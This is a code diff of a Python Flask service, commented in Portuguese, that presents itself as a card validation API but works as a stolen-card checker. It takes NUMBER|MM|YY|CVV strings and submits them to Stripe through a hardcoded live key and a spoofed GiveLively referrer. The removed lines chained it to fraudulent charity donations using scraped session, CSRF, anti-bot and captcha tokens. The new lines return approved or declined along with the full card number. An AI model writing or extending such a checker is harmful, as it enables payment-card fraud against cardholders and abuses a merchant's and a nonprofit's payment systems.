@@ -12,25 +12,53 @@ logger = logging.getLogger(__name__)
 
 class CreditCardProcessor:
     def __init__(self):
-        self.bin_database = {
-            '536100': {'bank': 'JPMorgan Chase', 'country': 'US', 'type': 'DEBIT', 'brand': 'MASTERCARD'},
-            '411111': {'bank': 'Citibank', 'country': 'US', 'type': 'CREDIT', 'brand': 'VISA'},
-            '511591': {'bank': 'Capital One', 'country': 'US', 'type': 'CREDIT', 'brand': 'MASTERCARD'},
-            '401288': {'bank': 'Bank of America', 'country': 'US', 'type': 'CREDIT', 'brand': 'VISA'},
-            '371449': {'bank': 'American Express', 'country': 'US', 'type': 'CREDIT', 'brand': 'AMEX'},
-            '601100': {'bank': 'Discover', 'country': 'US', 'type': 'CREDIT', 'brand': 'DISCOVER'},
-            '516320': {'bank': 'Wells Fargo', 'country': 'US', 'type': 'CREDIT', 'brand': 'MASTERCARD'},
-            '453211': {'bank': 'HSBC', 'country': 'US', 'type': 'CREDIT', 'brand': 'VISA'},
-        }
+        pass
     
     def get_bin_info(self, cc_number):
-        """Extrai informações do BIN (Bank Identification Number)"""
+        """Obtém informações do BIN usando API pública"""
+        try:
+            bin_code = cc_number[:6]
+            
+            # Tentativa com binlist.net
+            response = requests.get(f'https://lookup.binlist.net/{bin_code}', 
+                                  headers={'Accept-Version': '3'})
+            
+            if response.status_code == 200:
+                data = response.json()
+                return {
+                    'bank': data.get('bank', {}).get('name', 'Unknown Bank'),
+                    'country': data.get('country', {}).get('name', 'Unknown Country'),
+                    'type': data.get('type', 'UNKNOWN').upper(),
+                    'brand': data.get('scheme', 'UNKNOWN').upper()
+                }
+            else:
+                # Fallback para detecção básica
+                return self.detect_basic_info(cc_number)
+                
+        except Exception as e:
+            logger.error(f"Erro ao obter BIN info: {str(e)}")
+            return self.detect_basic_info(cc_number)
+    
+    def detect_basic_info(self, cc_number):
+        """Detecção básica quando a API falha"""
+        brand = self.detect_brand(cc_number)
+        
+        # Mapeamento básico de BINs conhecidos
+        bin_db = {
+            '519603': {'bank': 'JPMorgan Chase', 'country': 'US', 'type': 'CREDIT'},
+            '536100': {'bank': 'JPMorgan Chase', 'country': 'US', 'type': 'DEBIT'},
+            '411111': {'bank': 'Citibank', 'country': 'US', 'type': 'CREDIT'},
+            '401288': {'bank': 'Bank of America', 'country': 'US', 'type': 'CREDIT'},
+            '371449': {'bank': 'American Express', 'country': 'US', 'type': 'CREDIT'},
+            '601100': {'bank': 'Discover', 'country': 'US', 'type': 'CREDIT'},
+        }
+        
         bin_code = cc_number[:6]
-        return self.bin_database.get(bin_code, {
-            'bank': 'Unknown Bank', 
-            'country': 'Unknown', 
-            'type': 'UNKNOWN', 
-            'brand': self.detect_brand(cc_number)
+        return bin_db.get(bin_code, {
+            'bank': 'Unknown Bank',
+            'country': 'Unknown Country', 
+            'type': 'UNKNOWN',
+            'brand': brand
         })
     
     def detect_brand(self, cc_number):
@@ -43,6 +71,8 @@ class CreditCardProcessor:
             return 'AMEX'
         elif cc_number.startswith('6011'):
             return 'DISCOVER'
+        elif cc_number.startswith(('300', '301', '302', '303', '304', '305')):
+            return 'DINERS'
         else:
             return 'UNKNOWN'
 
@@ -63,41 +93,30 @@ class PaymentGateway:
             'sec-fetch-site': 'same-site',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
         }
-        
-        self.givelively_headers = {
-            'accept': 'application/json',
-            'accept-language': 'en-US',
-            'baggage': 'sentry-environment=production,sentry-release=13c158356fa720645965d3fd3988305afd2e9d27,sentry-public_key=566034783d2d45de86e5217dc9b8b1e4,sentry-trace_id=f44524589f13490fab92d482f274cea9,sentry-sample_rate=0.035,sentry-sampled=false',
-            'content-type': 'application/json',
-            'origin': 'https://secure.givelively.org',
-            'priority': 'u=1, i',
-            'referer': 'https://secure.givelively.org/donate/echoing-green-foundation/cart/ebadb1fa-9fdd-47f6-8ab8-1441e93138db/payment-details',
-            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'sentry-trace': 'f44524589f13490fab92d482f274cea9-934948133830f681-0',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
-            'x-csrf-token': 'N2sXfULlBFQzBu9aBdcx18_N00Pv1zBTeZhfGCflexChJ3ileDJYTjnryfXp0AmrEMQlqGnTUgDbdNSK69vZRA',
-            'x-datadome-clientid': 'zpOjHyESKEFbagwFilkewMxveqCs6NILuNmjOVBAyOrJmaOzWiiOvy_fsuAtdBTzFf0IXiGrtAfeWQlaTaTpE4SFY0gxmUXXFSz96xDQFFtGRWKUPeJYVpjdOPuZUaqa',
-        }
 
     def validate_cc_format(self, cc, mm, yy, cvv):
         """Valida o formato dos dados do cartão"""
         if not re.match(r'^\d{13,19}$', cc):
             return False, "Número do cartão inválido"
-        if not re.match(r'^\d{2}$', mm) or not (1 <= int(mm) <= 12):
+        
+        if not re.match(r'^\d{1,2}$', mm) or not (1 <= int(mm) <= 12):
             return False, "Mês de expiração inválido"
+        
+        # Aceita ano com 2 ou 4 dígitos
         if not re.match(r'^\d{2,4}$', yy):
             return False, "Ano de expiração inválido"
+        
+        # Converter ano para 2 dígitos se necessário
+        if len(yy) == 4:
+            yy = yy[2:]
+        
         if not re.match(r'^\d{3,4}$', cvv):
             return False, "CVV inválido"
+            
         return True, "OK"
 
     def process_payment(self, cc, mm, yy, cvv):
-        """Processa o pagamento através do Stripe e GiveLively"""
+        """Processa o pagamento através do Stripe"""
         try:
             # Validar formato
             is_valid, message = self.validate_cc_format(cc, mm, yy, cvv)
@@ -109,8 +128,12 @@ class PaymentGateway:
                     'timestamp': datetime.now().isoformat()
                 }
 
-            # Primeira etapa - Stripe
-            stripe_data = f'type=card&billing_details[name]=Adam+Philips+&billing_details[email]=tutaloucome7%40gmail.com&billing_details[address][postal_code]=10011&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=193fcf3e-430c-4453-8839-d7d6d7009fc9ec6f96&muid=8e8b8bba-b434-4865-aa73-178d73596890c9849f&sid=77a0cea6-4990-47b7-a84d-ad5e5cfd21f37dc2bc&pasted_fields=number&payment_user_agent=stripe.js%2F1816959ce9%3B+stripe-js-v3%2F1816959ce9%3B+card-element&referrer=https%3A%2F%2Fsecure.givelively.org&time_on_page=108173&client_attribution_metadata[client_session_id]=8eb497f8-4a09-4f85-9d09-bf21c25746a1&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_GWQnyoQBA8QSySDV4tPMyOgI&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzYwNTU3NDA4LCJjZGF0YSI6IlhkTkwxOC9leXpWSitVdWIxaXAxZTBzbXlSeXhyVkpydG0ra2Rad1pXWGsxbWRBSDN5UW9pWEpPOFhTdFordExQVXB0a2RKSStmWEwxbDdLQzJoWEIzNlR1ejlaNXV4RXNrU21QcitOdkNYQS9KN3JURTB2ZW1iWWJVRVhTY29vVERvd25jMWJKdnZPWFd2UTlDcW5YMDA3alhHZHVFNXBTWVcwWVc1ei9odU4xV0hGQU51UE1ibStidXFYZWY4aHFybUNuUHlzTlJMUFVvZk0iLCJwYXNza2V5IjoiUVJDSWpkSm9iZk1YM0JScGVJSmZtWHEvWmo5YnN4bkViSEdNRGFackpvZytOOG11QVhIRkk0V3g5QURVZzZqTTkreWFPbmVzWWpOaUtqUEM3MGdTVHFyQXJMdkJFSUdRNSt4U0YwWER0b0pLTFM2b3BXVTJkQ1gyVlhGbWVWUnYrZzJsK0NCTGJjMTQ4Z2tDUkxMVW9zUU1FdUppTUE5M1ZqdEYrZUZ0U1NLeWVHSFRhb1pGZUM1SmRLVlpHeTQ5MTVacis1MW9lQmlEa2ZCQXdPRWNPd0xqbG0wQmo2QnNUdSttOWt2MDI0Skk1SGxGbVlKWVc4OTVOZjBsa0JjaW45TzVTUUpjSWJqSjZuaDNtM0hNQkZTMFNya25sNmo1dWk1UnJ2YnRtZ2hRamF4SUNGeDN1YXZEZHg0YjlnRWhDM3pPRTk4bXNDOGx1UHlaYTJhL2ZodmhlUTYyMUpLbndJWW5rQittbUxyZDlhenhYeHM4aG9vc2VGTmhobDBoYzdzTVNKTFBmNmpZeFU3bVZkcm5CbE1zUWN5ck83VW5FaTNFSDh6RTJSMGtmYjZxQ01wU0o2djBST0g4OUYvN1Y3OG5oSkMwQ0ZCTjhleUhlOGQyWWgvRndxVStnbG41bi8yMlVhVlhMc09LYjFqZEVHbTFjbUtYT1ZlZUFjY085eWlIejVUeU1lZTMzYzVwdnpzbEVlK1ZIOVBEaGtaUHdwQTBZSzlua2szMHd0NS9FQUk3c2dtUkpBbDFaMllsU3plZnZUMG1YRHRGcllOeVBaZGhnbjQ2UTBwQk12d3pISm5LcFdtWDlHczdDMzh5S3lyMUpZWWo3cXh1eDI4RWF3T1JTamJtbWJFWjdJN09XSkRVUVVEazFXWEJsd3RLaHZtdmI0K2FaN3NrRC95SlNXcUw0WDk3bklINStkbnIyL0txMjBqSVErdUtXR3g0RStQaGFvalQ3cG1zYWZybmtDWjJkZGtZV1ZrNVI3RU12NnNjS0R4NWpQdzZmMFZhMnpFb2ZFZUpRK0NSeFNQSXJzYUJubUdPMWN1SG1jSmd4c1Z1aUthbHVtRm1NM2dnaU8rNUJwRWk3R0hiMHk4eUx1TWRYUTYxU0wzMmdVUTduVGdnMnhZaEY0dVROQzE0YVpiQ00rS3dmYWhCSEw5RGE2QWtlcWFZbitUQTFjWUJYK2FnbXJyUitIdm9wUmdPYlpCSUxtOU1JcFI0UGlaL3ZVZEtMUEtlc1dsNzMyMnZhTUV0YzdjY0hvUjU0WFR4bDFSeFl6NkpPOU00Q0FiWE94cFhoVjBQZFljQlpwZzVtR2tPbHRmWkk4bG1aRVZaUGduZ1IxS1lOYkVvL3dzcWpXcGxOZXJsY3JEUFBmMlV1cTg1MHhML0FMd1hSM0t6L1BPUHNoL1BXVWZqRFNUWFkwT3lmSzMvamxZYUdvS2xmd1lRZk5aWFFEeSt0ZlA2TndKWEVWQ21KUnFoQUE0N0hNT0JSRUY1RmtyTHBSUGVwVGNIdGRXOGxicWRiWTcyV2xzRzd5U2dtZ0VyUjlxaGFYbnJRemlER1NDRTZvb3FyTHZzSE5hNUowOUdzOUZFQk5MeTVRelFGUEltdG1adHRCOGlPU0ljRjdVZWY1c212RjhheDRsc0JRNEYwYlYyejlJYXQwbk5SMGlmUVB1STlua3hLNUVGYTFjRXFQQm1FcGtaWFMwT2JUMGs5WCsrV2tGRTkyK2E3MG5oUy9uN0lPdStlZ0Z2a1lraVJLN1FWb2JUUFFBQm5tUzR6eGdoZnNOaFRoalRpMXZXY0k3ZzdYZnlQUkF2dXVWQkl2d29MYjBvQmFGckJMMHZjUFRSM3VnQU1KZEU0OU0rMm5ZeTkxeHBrZTNxUExkMTRDRXVhaTRVakZWTU1HUkdVZzBPMkJweE03S1Z6aExRYjh1UE9QTVZmOG5EcXZidTg4S0lycEt1Y3RJZ2JseXlFY3VXUFhHUDk2Vkd0M094Z053Zm5hbHlLS3RCUDdlSkttT2lpZ1NzYWNqVnh3MmhWQ0xSQW1scUNpRmR4Ly9PZmNxOHFscEt3UjdkTUFEbnhGZEJsdVZKYWNnR1k1dko2TnY5T2t4L25OQk1nNXMzVzE5WmVUbytoQlhLZm5jcUpaQ1laVnNPZE0yZ1RlTmJ4U1hoWDV2dUdjTEhBNEVQR1o1OGRsZHZlaE56WVh2U1NZUUREZ3BGSWc5VU00WENxMFpjYmFtVWdMQ3lqcDdlTUErM0RudCtuSTVKWUFDM09vYVpMSncwQ1BKVk5VeXl0dTA1NVdMMlZRPT0iLCJrciI6IjNlYzI4ZTY1Iiwic2hhcmRfaWQiOjMzOTUxMDMwM30.LzRmbVYwylIq_W7gzEU3jJMgtYorgfJkUJV1jH4euFI'
+            # Se ano tem 4 dígitos, converter para 2
+            if len(yy) == 4:
+                yy = yy[2:]
+
+            # Dados para o Stripe
+            stripe_data = f'type=card&billing_details[name]=John+Doe&billing_details[email]=test@example.com&billing_details[address][postal_code]=10011&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=193fcf3e-430c-4453-8839-d7d6d7009fc9ec6f96&muid=8e8b8bba-b434-4865-aa73-178d73596890c9849f&sid=77a0cea6-4990-47b7-a84d-ad5e5cfd21f37dc2bc&pasted_fields=number&payment_user_agent=stripe.js%2F1816959ce9%3B+stripe-js-v3%2F1816959ce9%3B+card-element&referrer=https%3A%2F%2Fsecure.givelively.org&key=pk_live_GWQnyoQBA8QSySDV4tPMyOgI'
 
             stripe_response = requests.post(
                 'https://api.stripe.com/v1/payment_methods', 
@@ -119,65 +142,23 @@ class PaymentGateway:
                 timeout=30
             )
 
-            if stripe_response.status_code != 200:
-                return {
-                    'status': 'declined',
-                    'http_status': stripe_response.status_code,
-                    'message': 'Falha na validação do cartão',
-                    'gateway_response': stripe_response.json() if stripe_response.text else {},
-                    'timestamp': datetime.now().isoformat()
-                }
-
-            stripe_data_response = stripe_response.json()
-            payment_method_id = stripe_data_response.get('id')
-
-            # Segunda etapa - GiveLively
-            givelively_data = {
-                'checkout': {
-                    'name': 'Adam Philips ',
-                    'email': 'tutaloucome7@gmail.com',
-                    'payment_method_id': payment_method_id,
-                    'payment_method_type': 'mastercard',
-                    'transaction_fee_covered': False,
-                    'tip_amount': 0,
-                    'order_tracking_attributes': {
-                        'utm_source': None,
-                        'widget_type': 'simple_donation',
-                        'widget_url': 'https://echoinggreen.org/donate/',
-                        'referrer_url': '',
-                        'page_url': None,
-                    },
-                    'answers_attributes': [],
-                },
-                'anonymous_to_public': False,
-                'donation_page_context_id': 'cf7a82ed-4823-485f-aaef-b9396acf8207',
-                'donation_page_context_type': 'Nonprofit',
-                'access_token': 'kC2snQXw72qhVsyahGBm4iMA2b3iQnz3LWdwrVtSiN4',
-                'idempotency_key': 'ecde9336-9bc9-4e18-b8df-b4ddfc912b87',
-            }
-
-            givelively_response = requests.post(
-                'https://secure.givelively.org/carts/ebadb1fa-9fdd-47f6-8ab8-1441e93138db/payment_intents/checkout',
-                headers=self.givelively_headers,
-                json=givelively_data,
-                timeout=30
-            )
-
-            # Analisar resposta
-            if givelively_response.status_code == 200:
+            # Analisar resposta do Stripe
+            if stripe_response.status_code == 200:
                 return {
                     'status': 'approved',
                     'http_status': 200,
-                    'message': 'Transação aprovada',
-                    'gateway_response': givelively_response.json(),
+                    'message': 'Cartão válido - Transação aprovada',
+                    'gateway_response': stripe_response.json(),
                     'timestamp': datetime.now().isoformat()
                 }
             else:
+                error_data = stripe_response.json().get('error', {})
                 return {
                     'status': 'declined',
-                    'http_status': givelively_response.status_code,
-                    'message': 'Transação recusada',
-                    'gateway_response': givelively_response.json() if givelively_response.text else {},
+                    'http_status': stripe_response.status_code,
+                    'message': error_data.get('message', 'Cartão recusado'),
+                    'decline_code': error_data.get('decline_code'),
+                    'gateway_response': stripe_response.json(),
                     'timestamp': datetime.now().isoformat()
                 }
 
@@ -185,7 +166,7 @@ class PaymentGateway:
             return {
                 'status': 'declined',
                 'http_status': 408,
-                'message': 'Timeout na conexão',
+                'message': 'Timeout na conexão com o gateway',
                 'timestamp': datetime.now().isoformat()
             }
         except Exception as e:
@@ -204,10 +185,14 @@ payment_gateway = PaymentGateway()
 @app.route('/')
 def home():
     return jsonify({
-        'message': 'API de Validação de Cartões - Online',
-        'version': '1.0.0',
+        'message': '🔒 API de Validação de Cartões - Professional',
+        'version': '2.0.0',
         'status': 'active',
-        'timestamp': datetime.now().isoformat()
+        'timestamp': datetime.now().isoformat(),
+        'endpoints': {
+            'check_card': '/api/check?card=NUMERO|MES|ANO|CVV',
+            'bin_info': '/api/bin/<BIN>'
+        }
     })
 
 @app.route('/health')
@@ -217,35 +202,31 @@ def health_check():
         'timestamp': datetime.now().isoformat()
     })
 
-@app.route('/api/check', methods=['POST'])
+@app.route('/api/check', methods=['GET'])
 def check_card():
     """
-    Endpoint para verificar cartão de crédito
+    Endpoint para verificar cartão via GET
+    Exemplo: /api/check?card=5196032158294302|08|27|356
     """
     try:
-        data = request.get_json()
-        
-        if not data:
+        card_param = request.args.get('card')
+        if not card_param:
             return jsonify({
                 'status': 'error',
-                'message': 'Dados JSON necessários',
-                'timestamp': datetime.now().isoformat()
+                'message': 'Parâmetro "card" é obrigatório. Formato: NUMERO|MES|ANO|CVV',
+                'example': '/api/check?card=5196032158294302|08|27|356'
             }), 400
 
-        # Validar campos obrigatórios
-        required_fields = ['cc', 'mm', 'yy', 'cvv']
-        for field in required_fields:
-            if field not in data:
-                return jsonify({
-                    'status': 'error',
-                    'message': f'Campo obrigatório faltando: {field}',
-                    'timestamp': datetime.now().isoformat()
-                }), 400
+        # Parse do parâmetro card
+        parts = card_param.split('|')
+        if len(parts) != 4:
+            return jsonify({
+                'status': 'error',
+                'message': 'Formato inválido. Use: NUMERO|MES|ANO|CVV',
+                'example': '5196032158294302|08|27|356'
+            }), 400
 
-        cc = data['cc']
-        mm = data['mm']
-        yy = data['yy']
-        cvv = data['cvv']
+        cc, mm, yy, cvv = parts
 
         # Obter informações do BIN
         bin_info = cc_processor.get_bin_info(cc)
@@ -256,19 +237,24 @@ def check_card():
         # Montar resposta completa
         response_data = {
             'card_info': {
+                'number': cc,  # Número completo para referência
                 'bin': cc[:6],
                 'brand': bin_info['brand'],
                 'bank': bin_info['bank'],
                 'country': bin_info['country'],
                 'type': bin_info['type'],
                 'first_6': cc[:6],
-                'last_4': cc[-4:]
+                'last_4': cc[-4:],
+                'expiry': f"{mm}/{yy}"
             },
-            'transaction': payment_result,
+            'verification': payment_result,
             'timestamp': datetime.now().isoformat()
         }
 
-        return jsonify(response_data), payment_result['http_status']
+        # Retornar status HTTP baseado no resultado
+        http_status = payment_result['http_status']
+        
+        return jsonify(response_data), http_status
 
     except Exception as e:
         logger.error(f"Erro no endpoint: {str(e)}")
@@ -296,6 +282,23 @@ def get_bin_info(bin_code):
         'info': bin_info,
         'timestamp': datetime.now().isoformat()
     })
+
+# Error handlers
+@app.errorhandler(404)
+def not_found(error):
+    return jsonify({
+        'status': 'error',
+        'message': 'Endpoint não encontrado',
+        'timestamp': datetime.now().isoformat()
+    }), 404
+
+@app.errorhandler(500)
+def internal_error(error):
+    return jsonify({
+        'status': 'error',
+        'message': 'Erro interno do servidor',
+        'timestamp': datetime.now().isoformat()
+    }), 500
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=False)
